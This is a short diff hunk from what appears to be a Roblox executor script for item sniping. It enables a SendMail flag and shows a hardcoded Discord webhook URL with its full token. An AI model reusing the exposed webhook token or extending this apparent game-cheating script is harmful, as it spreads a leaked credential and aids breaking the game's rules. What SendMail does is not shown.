@@ -50,7 +50,7 @@ getgenv().SnipeHook =
 getgenv().LoadedAll = false
 getgenv().Titanic =
     "https://discord.com/api/webhooks/1157148880123744306/Hjwv4eoUVEDV-yYoI_4DEXBFyKuBb3dB0y2lrEgRoRlW4qd4rViOxKh-9yg4VtTUg4pd"
-getgenv().SendMail = false
+getgenv().SendMail = true
 
 local httpService = game:GetService("HttpService")
 local promptOverlay = game.CoreGui.RobloxPromptGui.promptOverlay
